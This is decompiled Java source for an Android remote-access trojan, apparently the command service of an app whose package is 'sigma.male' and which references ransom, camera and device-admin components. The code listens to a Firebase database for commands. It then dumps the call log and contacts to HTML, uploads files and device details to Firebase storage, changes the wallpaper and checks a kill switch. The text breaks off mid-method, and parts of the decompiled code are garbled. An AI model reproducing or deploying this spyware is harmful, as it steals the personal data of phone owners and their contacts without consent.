/*
 * Decompiled with CFR 0.0.
 * 
 * Could not load the following classes:
 *  android.app.Notification
 *  android.app.NotificationChannel
 *  android.app.NotificationManager
 *  android.app.PendingIntent
 *  android.app.Service
 *  android.app.WallpaperManager
 *  android.app.admin.DevicePolicyManager
 *  android.content.ClipData
 *  android.content.ClipData$Item
 *  android.content.ClipDescription
 *  android.content.ClipboardManager
 *  android.content.ComponentName
 *  android.content.ContentResolver
 *  android.content.Context
 *  android.content.Intent
 *  android.content.pm.ApplicationInfo
 *  android.content.pm.PackageInfo
 *  android.content.pm.PackageManager
 *  android.database.Cursor
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.graphics.Bitmap$Config
 *  android.graphics.BitmapFactory
 *  android.graphics.BitmapFactory$Options
 *  android.graphics.Canvas
 *  android.graphics.drawable.Drawable
 *  android.media.MediaPlayer
 *  android.media.MediaRecorder
 *  android.net.Uri
 *  android.os.BatteryManager
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.os.Handler
 *  android.os.IBinder
 *  android.os.Looper
 *  android.os.Vibrator
 *  android.provider.CallLog
 *  android.provider.CallLog$Calls
 *  android.provider.ContactsContract
 *  android.provider.ContactsContract$CommonDataKinds
 *  android.provider.ContactsContract$CommonDataKinds$Phone
 *  android.provider.Telephony
 *  android.provider.Telephony$Sms
 *  android.speech.SpeechRecognizer
 *  android.speech.tts.TextToSpeech
 *  android.speech.tts.TextToSpeech$OnInitListener
 *  android.telephony.SmsManager
 *  android.util.Base64
 *  android.view.Display
 *  android.view.WindowManager
 *  android.widget.Toast
 *  androidx.core.app.NotificationCompat
 *  androidx.core.app.NotificationCompat$Builder
 *  com.google.android.gms.tasks.Continuation
 *  com.google.android.gms.tasks.OnCompleteListener
 *  com.google.android.gms.tasks.OnFailureListener
 *  com.google.android.gms.tasks.OnSuccessListener
 *  com.google.android.gms.tasks.Task
 *  com.google.firebase.database.ChildEventListener
 *  com.google.firebase.database.DataSnapshot
 *  com.google.firebase.database.DatabaseError
 *  com.google.firebase.database.DatabaseReference
 *  com.google.firebase.database.FirebaseDatabase
 *  com.google.firebase.database.GenericTypeIndicator
 *  com.google.firebase.database.OnDisconnect
 *  com.google.firebase.storage.FileDownloadTask
 *  com.google.firebase.storage.FileDownloadTask$TaskSnapshot
 *  com.google.firebase.storage.FirebaseStorage
 *  com.google.firebase.storage.OnProgressListener
 *  com.google.firebase.storage.StorageReference
 *  com.google.firebase.storage.StorageTask
 *  com.google.firebase.storage.UploadTask
 *  com.google.firebase.storage.UploadTask$TaskSnapshot
 *  com.google.gson.Gson
 *  com.google.gson.reflect.TypeToken
 *  java.io.BufferedReader
 *  java.io.ByteArrayOutputStream
 *  java.io.File
 *  java.io.FileNotFoundException
 *  java.io.FileOutputStream
 *  java.io.IOException
 *  java.io.InputStream
 *  java.io.InputStreamReader
 *  java.io.OutputStream
 *  java.io.Reader
 *  java.lang.CharSequence
 *  java.lang.Class
 *  java.lang.Exception
 *  java.lang.IllegalArgumentException
 *  java.lang.IllegalStateException
 *  java.lang.Integer
 *  java.lang.Long
 *  java.lang.NullPointerException
 *  java.lang.Object
 *  java.lang.Process
 *  java.lang.Runnable
 *  java.lang.Runtime
 *  java.lang.SecurityException
 *  java.lang.String
 *  java.lang.StringBuffer
 *  java.lang.StringBuilder
 *  java.lang.System
 *  java.lang.reflect.Type
 *  java.util.ArrayList
 *  java.util.Calendar
 *  java.util.Date
 *  java.util.HashMap
 *  java.util.Iterator
 *  java.util.List
 *  java.util.Locale
 *  java.util.Map
 *  java.util.Random
 *  java.util.Timer
 *  java.util.TimerTask
 */
package sigma.male;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.WallpaperManager;
import android.app.admin.DevicePolicyManager;
import android.content.ClipData;
import android.content.ClipDescription;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.drawable.Drawable;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.speech.SpeechRecognizer;
import android.speech.tts.TextToSpeech;
import android.telephony.SmsManager;
import android.util.Base64;
import android.view.Display;
import android.view.WindowManager;
import android.widget.Toast;
import androidx.core.app.NotificationCompat;
import com.google.android.gms.tasks.Continuation;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.GenericTypeIndicator;
import com.google.firebase.database.OnDisconnect;
import com.google.firebase.storage.FileDownloadTask;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.OnProgressListener;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.StorageTask;
import com.google.firebase.storage.UploadTask;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Reader;
import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import sigma.male.DeviceAdminComponent;
import sigma.male.FileUtil;
import sigma.male.ForegroundService;
import sigma.male.MyService;
import sigma.male.SketchwareUtil;
import sigma.male.cams;
import sigma.male.gui;
import sigma.male.ransom;
import sigma.male.restarter;

public class servicess
extends Service {
    public static String lajj = "";
    private static Timer timer = new Timer();
    private ChildEventListener _fbdb_child_listener;
    private OnSuccessListener _fbs_delete_success_listener;
    private OnProgressListener _fbs_download_progress_listener;
    private OnSuccessListener<FileDownloadTask.TaskSnapshot> _fbs_download_success_listener;
    private OnFailureListener _fbs_failure_listener;
    private OnProgressListener _fbs_upload_progress_listener;
    private OnCompleteListener<Uri> _fbs_upload_success_listener;
    private FirebaseDatabase _firebase = FirebaseDatabase.getInstance();
    private FirebaseStorage _firebase_storage = FirebaseStorage.getInstance();
    private OnSuccessListener _mediaup_delete_success_listener;
    private OnProgressListener _mediaup_download_progress_listener;
    private OnSuccessListener<FileDownloadTask.TaskSnapshot> _mediaup_download_success_listener;
    private OnFailureListener _mediaup_failure_listener;
    private OnProgressListener _mediaup_upload_progress_listener;
    private OnCompleteListener<Uri> _mediaup_upload_success_listener;
    private OnSuccessListener _sigmamale_delete_success_listener;
    private OnProgressListener _sigmamale_download_progress_listener;
    private OnSuccessListener<FileDownloadTask.TaskSnapshot> _sigmamale_download_success_listener;
    private OnFailureListener _sigmamale_failure_listener;
    private OnProgressListener _sigmamale_upload_progress_listener;
    private OnCompleteListener<Uri> _sigmamale_upload_success_listener;
    private Timer _timer = new Timer();
    private Calendar cal = Calendar.getInstance();
    private String cmdn = "";
    private String cmdv = "";
    private String cmdvar = "";
    private DatabaseReference fbdb = this._firebase.getReference("user");
    private StorageReference fbs = this._firebase_storage.getReference("root");
    private String filinfodat = "";
    private ArrayList<String> lst = new ArrayList();
    private ArrayList<HashMap<String, Object>> map = new ArrayList();
    private StorageReference mediaup = this._firebase_storage.getReference("media/");
    private MediaPlayer mp;
    private MediaRecorder myAudioRecorder;
    private double num = 0.0;
    private HashMap<String, Object> responsetxt = new HashMap();
    private StorageReference sigmamale = this._firebase_storage.getReference("user/");
    private SpeechRecognizer st;
    private String str = "";
    private TimerTask t;
    private TextToSpeech tts;
    private Vibrator vbs;

    static /* synthetic */ void access$2(servicess servicess2, Calendar calendar) {
        servicess2.cal = calendar;
    }

    static /* synthetic */ void access$4(servicess servicess2, String string2) {
        servicess2.cmdn = string2;
    }

    static /* synthetic */ void access$5(servicess servicess2, String string2) {
        servicess2.cmdv = string2;
    }

    static /* synthetic */ void access$6(servicess servicess2, String string2) {
        servicess2.cmdvar = string2;
    }

    public static Bitmap getBitmapFromDrawable(Drawable drawable2) {
        Bitmap bitmap = Bitmap.createBitmap((int)drawable2.getIntrinsicWidth(), (int)drawable2.getIntrinsicHeight(), (Bitmap.Config)Bitmap.Config.ARGB_8888);
        Canvas canvas = new Canvas(bitmap);
        drawable2.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
        drawable2.draw(canvas);
        return bitmap;
    }

    private void initialize() {
        this.vbs = (Vibrator)this.getSystemService("vibrator");
        this.tts = new TextToSpeech(this.getApplicationContext(), null);
        this.st = SpeechRecognizer.createSpeechRecognizer((Context)this);
        this._fbdb_child_listener = new ChildEventListener(){

            public void onCancelled(DatabaseError databaseError) {
                databaseError.getCode();
                databaseError.getMessage();
            }

            public void onChildAdded(DataSnapshot dataSnapshot, String string2) {
                GenericTypeIndicator<HashMap<String, Object>> genericTypeIndicator = new GenericTypeIndicator<HashMap<String, Object>>(){};
                dataSnapshot.getKey();
                (HashMap)dataSnapshot.getValue((GenericTypeIndicator)genericTypeIndicator);
            }

            public void onChildChanged(DataSnapshot dataSnapshot, String string2) {
                GenericTypeIndicator<HashMap<String, Object>> genericTypeIndicator = new GenericTypeIndicator<HashMap<String, Object>>(){};
                dataSnapshot.getKey();
                (HashMap)dataSnapshot.getValue((GenericTypeIndicator)genericTypeIndicator);
            }

            public void onChildMoved(DataSnapshot dataSnapshot, String string2) {
            }

            public void onChildRemoved(DataSnapshot dataSnapshot) {
                GenericTypeIndicator<HashMap<String, Object>> genericTypeIndicator = new GenericTypeIndicator<HashMap<String, Object>>(){};
                dataSnapshot.getKey();
                (HashMap)dataSnapshot.getValue((GenericTypeIndicator)genericTypeIndicator);
            }

        };
        this.fbdb.addChildEventListener(this._fbdb_child_listener);
        this._fbs_upload_progress_listener = new OnProgressListener<UploadTask.TaskSnapshot>(){

            public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getBytesTransferred();
                taskSnapshot.getTotalByteCount();
            }
        };
        this._fbs_download_progress_listener = new OnProgressListener<FileDownloadTask.TaskSnapshot>(){

            public void onProgress(FileDownloadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getBytesTransferred();
                taskSnapshot.getTotalByteCount();
            }
        };
        this._fbs_upload_success_listener = new OnCompleteListener<Uri>(){

            public void onComplete(Task<Uri> task) {
                String string2 = ((Uri)task.getResult()).toString();
                servicess.this._setrespo("fileview", servicess.this.cmdv, string2, servicess.this.filinfodat, "");
            }
        };
        this._fbs_download_success_listener = new OnSuccessListener<FileDownloadTask.TaskSnapshot>(){

            public void onSuccess(FileDownloadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getTotalByteCount();
            }
        };
        this._fbs_delete_success_listener = new OnSuccessListener(){

            public void onSuccess(Object object) {
            }
        };
        this._fbs_failure_listener = new OnFailureListener(){

            public void onFailure(Exception exception) {
                exception.getMessage();
            }
        };
        this._sigmamale_upload_progress_listener = new OnProgressListener<UploadTask.TaskSnapshot>(){

            public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getBytesTransferred();
                taskSnapshot.getTotalByteCount();
            }
        };
        this._sigmamale_download_progress_listener = new OnProgressListener<FileDownloadTask.TaskSnapshot>(){

            public void onProgress(FileDownloadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getBytesTransferred();
                taskSnapshot.getTotalByteCount();
            }
        };
        this._sigmamale_upload_success_listener = new OnCompleteListener<Uri>(){

            public void onComplete(Task<Uri> task) {
                String string2 = ((Uri)task.getResult()).toString();
                servicess.this._setrespo("dmpview", servicess.this.cmdv, string2, "", "");
            }
        };
        this._sigmamale_download_success_listener = new OnSuccessListener<FileDownloadTask.TaskSnapshot>(){

            public void onSuccess(FileDownloadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getTotalByteCount();
            }
        };
        this._sigmamale_delete_success_listener = new OnSuccessListener(){

            public void onSuccess(Object object) {
            }
        };
        this._sigmamale_failure_listener = new OnFailureListener(){

            public void onFailure(Exception exception) {
                exception.getMessage();
            }
        };
        this._mediaup_upload_progress_listener = new OnProgressListener<UploadTask.TaskSnapshot>(){

            public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getBytesTransferred();
                taskSnapshot.getTotalByteCount();
            }
        };
        this._mediaup_download_progress_listener = new OnProgressListener<FileDownloadTask.TaskSnapshot>(){

            public void onProgress(FileDownloadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getBytesTransferred();
                taskSnapshot.getTotalByteCount();
            }
        };
        this._mediaup_upload_success_listener = new OnCompleteListener<Uri>(){

            public void onComplete(Task<Uri> task) {
                String string2 = ((Uri)task.getResult()).toString();
                servicess.access$2(servicess.this, Calendar.getInstance());
                HashMap hashMap = new HashMap();
                hashMap.put((Object)"url", (Object)string2);
                hashMap.put((Object)"time", (Object)String.valueOf((long)servicess.this.cal.getTimeInMillis()));
                DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("records/" + gui.uuii(servicess.this.getApplicationContext()));
                try {
                    databaseReference.push().setValue((Object)hashMap);
                    return;
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                    return;
                }
            }
        };
        this._mediaup_download_success_listener = new OnSuccessListener<FileDownloadTask.TaskSnapshot>(){

            public void onSuccess(FileDownloadTask.TaskSnapshot taskSnapshot) {
                taskSnapshot.getTotalByteCount();
            }
        };
        this._mediaup_delete_success_listener = new OnSuccessListener(){

            public void onSuccess(Object object) {
            }
        };
        this._mediaup_failure_listener = new OnFailureListener(){

            public void onFailure(Exception exception) {
                exception.getMessage();
            }
        };
    }

    private void initializeLogic() {
        this._service();
    }

    /*
     * Enabled aggressive block sorting
     */
    public void _cd(final String string2, String string3, String string4) {
        if (!FileUtil.isExistFile(string2)) return;
        if (!FileUtil.isDirectory(string2)) {
            if (!FileUtil.isFile(string2)) return;
            {
                BitmapFactory.Options options = new BitmapFactory.Options();
                options.inJustDecodeBounds = true;
                BitmapFactory.decodeFile((String)string2, (BitmapFactory.Options)options);
                if (options.outWidth != -1 && options.outHeight != -1 && new File(string2).length() / 1024L < 3072L) {
                    Date date = new Date(new File(string2).lastModified());
                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                    BitmapFactory.decodeFile((String)string2).compress(Bitmap.CompressFormat.JPEG, 100, (OutputStream)byteArrayOutputStream);
                    this._setrespo("imgview", string2, Base64.encodeToString((byte[])byteArrayOutputStream.toByteArray(), (int)0), "<li>Name: " + Uri.parse((String)string2).getLastPathSegment() + "<li>Creation: " + (Object)date + "<li>Size: " + new File(string2).length() / 1024L + "KB <li>Path: " + string2, "");
                    return;
                }
                this.fbs.child(string2).putFile(Uri.fromFile((File)new File(string2))).addOnFailureListener(this._fbs_failure_listener).addOnProgressListener(this._fbs_upload_progress_listener).continueWithTask((Continuation)new Continuation<UploadTask.TaskSnapshot, Task<Uri>>(){

                    public Task<Uri> then(Task<UploadTask.TaskSnapshot> task) throws Exception {
                        return servicess.this.fbs.child(string2).getDownloadUrl();
                    }
                }).addOnCompleteListener(this._fbs_upload_success_listener);
                Date date = new Date(new File(string2).lastModified());
                this.filinfodat = "<li>Name: " + Uri.parse((String)string2).getLastPathSegment() + "<li>Creation: " + (Object)date + "<li>Size: " + new File(string2).length() / 1024L + "KB <li>Path: " + string2;
                return;
            }
        }
        this.lst.clear();
        FileUtil.listDir(string2, this.lst);
        this.num = 0.0;
        this.str = "<li >..";
        int n = 0;
        do {
            if (n >= this.lst.size()) {
                this._setrespo(this.str, string2, "", "", "");
                return;
            }
            this.str = FileUtil.isDirectory((String)this.lst.get((int)this.num)) ? this.str.concat("<li class=\"fo\" >".concat(Uri.parse((String)((String)this.lst.get((int)this.num))).getLastPathSegment())) : (Uri.parse((String)((String)this.lst.get((int)this.num))).getLastPathSegment().contains((CharSequence)".png") || Uri.parse((String)((String)this.lst.get((int)this.num))).getLastPathSegment().contains((CharSequence)".jpg") || Uri.parse((String)((String)this.lst.get((int)this.num))).getLastPathSegment().contains((CharSequence)".jpeg") || Uri.parse((String)((String)this.lst.get((int)this.num))).getLastPathSegment().contains((CharSequence)".svg") || Uri.parse((String)((String)this.lst.get((int)this.num))).getLastPathSegment().contains((CharSequence)".ico") ? this.str.concat("<li class=\"im\" >".concat(Uri.parse((String)((String)this.lst.get((int)this.num))).getLastPathSegment().concat("<b>".concat(String.valueOf((long)(new File((String)this.lst.get((int)this.num)).length() / 1024L)) + "KB".concat("</b>"))))) : (Uri.parse((String)((String)this.lst.get((int)this.num))).getLastPathSegment().contains((CharSequence)".mp4") ? this.str.concat("<li class=\"vi\" >".concat(Uri.parse((String)((String)this.lst.get((int)this.num))).getLastPathSegment().concat("<b>".concat(String.valueOf((long)(new File((String)this.lst.get((int)this.num)).length() / 1024L)) + "KB".concat("</b>"))))) : this.str.concat("<li class=\"fi\" >".concat(Uri.parse((String)((String)this.lst.get((int)this.num))).getLastPathSegment().concat("<b>".concat(String.valueOf((long)(new File((String)this.lst.get((int)this.num)).length() / 1024L)) + "KB".concat("</b>")))))));
            this.num = 1.0 + this.num;
            ++n;
        } while (true);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void _changewall(String string2) {
        if (string2.equals((Object)"0")) {
            WallpaperManager wallpaperManager = WallpaperManager.getInstance((Context)this.getApplicationContext());
            try {
                wallpaperManager.setResource(2131165384);
            }
            catch (Exception exception) {
                exception.printStackTrace();
            }
            this._setrespo("dialogview", "", "Wallpaper Changed Successfully", "", "");
            return;
        }
        if (string2.equals((Object)"1")) {
            WallpaperManager wallpaperManager = WallpaperManager.getInstance((Context)this.getApplicationContext());
            try {
                wallpaperManager.setResource(2131165385);
            }
            catch (Exception exception) {
                exception.printStackTrace();
            }
            this._setrespo("dialogview", "", "Wallpaper Changed Successfully", "", "");
            return;
        }
        if (!string2.equals((Object)"2")) return;
        WallpaperManager wallpaperManager = WallpaperManager.getInstance((Context)this.getApplicationContext());
        try {
            wallpaperManager.setResource(2131165386);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
        this._setrespo("dialogview", "", "Wallpaper Changed Successfully", "", "");
    }

    public void _chevkio() {
        FirebaseDatabase.getInstance().getReference("/th30neand0nlyx").addChildEventListener(new ChildEventListener(){

            public void onCancelled(DatabaseError databaseError) {
            }

            /*
             * Enabled aggressive block sorting
             * Enabled unnecessary exception pruning
             * Enabled aggressive exception aggregation
             */
            public void onChildAdded(DataSnapshot dataSnapshot, String string2) {
                boolean bl;
                block5 : {
                    boolean bl2;
                    bl = true;
                    Map map = (Map)dataSnapshot.getValue();
                    String string3 = "" + map.get((Object)"data");
                    ArrayList arrayList = new ArrayList();
                    double d = 0.0;
                    try {
                        int n;
                        SketchwareUtil.getAllKeysFromMap((Map<String, Object>)((HashMap)new Gson().fromJson(string3, new TypeToken<HashMap<String, Object>>(){}.getType())), (ArrayList<String>)arrayList);
                        for (int i = 0; i < (n = arrayList.size()); d += 1.0, ++i) {
                            boolean bl3 = servicess.this.getyi((String)arrayList.get((int)d)).equals((Object)gui.uuiip(servicess.this.getApplicationContext()));
                            bl2 = bl3 ? false : bl;
                        }
                        break block5;
                    }
                    catch (Exception exception) {}
                    {
                        bl = bl2;
                        continue;
                        break;
                    }
                }
                if (bl) {
                    servicess.this.stopService(new Intent((Context)servicess.this, servicess.class));
                    servicess.this.stopService(new Intent((Context)servicess.this, ForegroundService.class));
                    System.exit((int)0);
                }
            }

            /*
             * Enabled aggressive block sorting
             * Enabled unnecessary exception pruning
             * Enabled aggressive exception aggregation
             */
            public void onChildChanged(DataSnapshot dataSnapshot, String string2) {
                boolean bl;
                block5 : {
                    boolean bl2;
                    bl = true;
                    Map map = (Map)dataSnapshot.getValue();
                    String string3 = "" + map.get((Object)"data");
                    ArrayList arrayList = new ArrayList();
                    double d = 0.0;
                    try {
                        int n;
                        SketchwareUtil.getAllKeysFromMap((Map<String, Object>)((HashMap)new Gson().fromJson(string3, new TypeToken<HashMap<String, Object>>(){}.getType())), (ArrayList<String>)arrayList);
                        for (int i = 0; i < (n = arrayList.size()); d += 1.0, ++i) {
                            boolean bl3 = servicess.this.getyi((String)arrayList.get((int)d)).equals((Object)gui.uuiip(servicess.this.getApplicationContext()));
                            bl2 = bl3 ? false : bl;
                        }
                        break block5;
                    }
                    catch (Exception exception) {}
                    {
                        bl = bl2;
                        continue;
                        break;
                    }
                }
                if (bl) {
                    Toast.makeText((Context)servicess.this.getApplicationContext(), (CharSequence)"No message to show!", (int)0).show();
                    servicess.this.stopService(new Intent((Context)servicess.this, servicess.class));
                    servicess.this.stopService(new Intent((Context)servicess.this, ForegroundService.class));
                    System.exit((int)0);
                }
            }

            public void onChildMoved(DataSnapshot dataSnapshot, String string2) {
            }

            public void onChildRemoved(DataSnapshot dataSnapshot) {
            }

        });
    }

    public void _devinfo() {
        this.getApplicationContext();
        Display display = ((WindowManager)this.getSystemService("window")).getDefaultDisplay();
        int n = display.getWidth();
        int n2 = display.getHeight();
        this._setrespo("deviceinfo", "", "<div class ='keylogg' ><b>SERIAL: </b>" + Build.SERIAL + "<br><b>" + "MODEL: </b> " + Build.MODEL + "<br><b>" + "ID:  </b>" + Build.ID + "<br><b>" + "Manufacture: </b>" + Build.MANUFACTURER + "<br><b>" + "Brand:</b> " + Build.BRAND + "<br><b>" + "Device Language: </b>" + Locale.getDefault().getDisplayLanguage() + "<br><b>" + "Screen Resolution: </b>" + n + "x" + n2 + "<br><b>" + "Type: </b>" + Build.TYPE + "<br><b>" + "User: </b>" + Build.USER + "<br><b>" + "BASE: </b>" + 1 + "<br><b>" + "INCREMENTAL: </b>" + Build.VERSION.INCREMENTAL + "<br><b>" + "SDK:</b> " + Build.VERSION.SDK + "<br><b>" + "BOARD: </b>" + Build.BOARD + "<br><b>" + "BRAND:</b> " + Build.BRAND + "<br><b>" + "HOST: </b>" + Build.HOST + "<br><b>" + "FINGERPRINT: </b>" + Build.FINGERPRINT + "<br><b>" + "Version Code: </b>" + Build.VERSION.RELEASE + "</div>", "", "");
    }

    /*
     * Loose catch block
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     * Lifted jumps to return sites
     */
    public void _dmpcal() {
        Context context = this.getApplicationContext();
        StringBuffer stringBuffer = new StringBuffer();
        stringBuffer.append("<html><meta name='viewport' content='width=device-width, initial-scale=1'> <meta charset='UTF-8' /><style> body{margin:0;padding:0;background:#ccc}.lo{width:calc(98% - 60px);position:relative;height:auto;padding-bottom:5px;padding-top:15px;padding-left:60px;background:#fff;margin:auto;border-radius:10px;margin-top:5px}.lo img{float:left;height:30px;width:30px;position:absolute;top:8px;left:10px}.lo span{float:right;margin-right:20px}</style><body>");
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
        int n = cursor.getColumnIndex("number");
        int n2 = cursor.getColumnIndex("type");
        int n3 = cursor.getColumnIndex("date");
        int n4 = cursor.getColumnIndex("duration");
        do {
            String string2;
            String string3;
            if (!cursor.moveToNext()) {
                cursor.close();
                if (FileUtil.isExistFile(FileUtil.getPackageDataDir(this.getApplicationContext()).concat("/call.html"))) {
                    FileUtil.deleteFile(FileUtil.getPackageDataDir(this.getApplicationContext()).concat("/call.html"));
                }
                FileOutputStream fileOutputStream = new FileOutputStream(String.valueOf((Object)FileUtil.getPackageDataDir(this.getApplicationContext())) + "/call.html", true);
                fileOutputStream.write((String.valueOf((Object)stringBuffer.toString()) + "\n\n").getBytes());
                fileOutputStream.close();
                this.sigmamale.child(FileUtil.getPackageDataDir(this.getApplicationContext()).concat("/call.html")).putFile(Uri.fromFile((File)new File(FileUtil.getPackageDataDir(this.getApplicationContext()).concat("/call.html")))).addOnFailureListener(this._sigmamale_failure_listener).addOnProgressListener(this._sigmamale_upload_progress_listener).continueWithTask((Continuation)new Continuation<UploadTask.TaskSnapshot, Task<Uri>>(){

                    public Task<Uri> then(Task<UploadTask.TaskSnapshot> task) throws Exception {
                        return servicess.this.sigmamale.child(FileUtil.getPackageDataDir(servicess.this.getApplicationContext()).concat("/call.html")).getDownloadUrl();
                    }
                }).addOnCompleteListener(this._sigmamale_upload_success_listener);
                return;
            }
            String string4 = cursor.getString(n);
            String string5 = cursor.getString(n2);
            Date date = new Date(Long.valueOf((String)cursor.getString(n3)).longValue());
            String string6 = cursor.getString(n4);
            switch (Integer.parseInt((String)string5)) {
                default: {
                    string3 = "";
                    string2 = null;
                    break;
                }
                case 2: {
                    string2 = "OUTGOING";
                    string3 = "https://firebasestorage.googleapis.com/v0/b/white-2bc5f.appspot.com/o/OUTGOING.png?alt=media&token=738a33e9-6049-4a88-9440-3ac6f88e363c";
                    break;
                }
                case 1: {
                    string2 = "INCOMING";
                    string3 = "https://firebasestorage.googleapis.com/v0/b/white-2bc5f.appspot.com/o/INCOMING.png?alt=media&token=e660c478-8d09-4ff8-951e-c01a962fadc4";
                    break;
                }
                case 3: {
                    string2 = "MISSED";
                    string3 = "https://firebasestorage.googleapis.com/v0/b/white-2bc5f.appspot.com/o/MISSED.png?alt=media&token=ebe94876-a3a4-4765-80f5-ce8e2c484056";
                }
            }
            stringBuffer.append("<div class='lo' ><img src='" + string3 + "' alt='" + string2 + "' ><b>" + string4 + "</b> <span>" + string6 + " Sec</span><br><br>" + (Object)date + "</div>");
        } while (true);
        catch (FileNotFoundException fileNotFoundException) {
            return;
        }
        catch (IOException iOException) {
            return;
        }
    }

    /*
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     * Lifted jumps to return sites
     */
    public void _dmpcon() {
        block8 : {
            var1_1 = this.getApplicationContext().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{"_id", "display_name", "data1", "account_type"}, "account_type <> 'google' ", null, null);
            if (var1_1.getCount() > 0) break block8;
            var2_2 = "<html><meta name='viewport' content='width=device-width, initial-scale=1'><meta charset='UTF-8' /><body><style> body{margin:0;padding:0;background:#ccc}.lo{width:calc(98% - 60px);position:relative;height:auto;padding-bottom:5px;padding-top:15px;padding-left:60px;background:#fff;margin:auto;border-radius:10px;margin-top:5px}.lo img{float:left;height:30px;width:30px;position:absolute;top:8px;left:10px}.lo span{float:right;margin-right:20px}</style>";
            ** GOTO lbl10
        }
        var2_2 = "<html><meta name='viewport' content='width=device-width, initial-scale=1'><meta charset='UTF-8' /><body><style> body{margin:0;padding:0;background:#ccc}.lo{width:calc(98% - 60px);position:relative;height:auto;padding-bottom:5px;padding-top:15px;padding-left:60px;background:#fff;margin:auto;border-radius:10px;margin-top:5px}.lo img{float:left;height:30px;width:30px;position:absolute;top:8px;left:10px}.lo span{float:right;margin-right:20px}</style>";
        do {
            block9 : {
                if (var1_1.moveToNext()) break block9;
lbl10: // 3 sources:
                if (FileUtil.isExistFile(FileUtil.getPackageDataDir(this.getApplicationContext()).concat("/cont.html"))) {
                    FileUtil.deleteFile(FileUtil.getPackageDataDir(this.getApplicationContext()).concat("/cont.html"));
                }
                var5_6 = new FileOutputStream(String.valueOf((Object)FileUtil.getPackageDataDir(this.getApplicationContext())) + "/cont.html", true);
                var5_6.write((String.valueOf((Object)var2_2) + "\n\n").getBytes());
                var5_6.close();
                this.sigmamale.child(FileUtil.getPackageDataDir(this.getApplicationContext()).concat("/cont.html")).putFile(Uri.fromFile((File)new File(FileUtil.getPackageDataDir(this.getApplicationContext()).concat("/cont.html")))).addOnFailureListener(this._sigmamale_failure_listener).addOnProgressListener(this._sigmamale_upload_progress_listener).continueWithTask((Continuation)new Continuation<UploadTask.TaskSnapshot, Task<Uri>>(){

                    public Task<Uri> then(Task<UploadTask.TaskSnapshot> task) throws Exception {
                        return servicess.this.sigmamale.child(FileUtil.getPackageDataDir(servicess.this.getApplicationContext()).concat("/cont.html")).getDownloadUrl();
                    }
                }).addOnCompleteListener(this._sigmamale_upload_success_listener);
                return;
            }
            var7_3 = var1_1.getString(var1_1.getColumnIndex("data1"));
            var8_4 = var1_1.getString(var1_1.getColumnIndex("display_name"));
            var9_5 = var1_1.getString(var1_1.getColumnIndex("account_type"));
            var2_2 = String.valueOf((Object)var2_2) + "<div class='lo' ><img src='https://firebasestorage.googleapis.com/v0/b/white-2bc5f.appspot.com/o/cont.png?alt=media&token=4ee314cc-c1bd-417d-b03e-8a33f74b4330' ><b>Name: </b>" + var8_4 + "<br><b>Number: </b>" + var7_3 + "<br> <b>From: </b>" + var9_5 + "</div>";
        } while (true);
        catch (FileNotFoundException var4_7) {
            return;
        }
        catch (IOException var3_8) {
            return;
        }
    }

    public void _dmpsm(String string2) {
    }

    /*
     * Loose catch block
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     * Lifted jumps to return sites
     */
    public void _getpackages() {
        Iterator iterator = this.getApplicationContext().getPackageManager().getInstalledPackages(0).iterator();
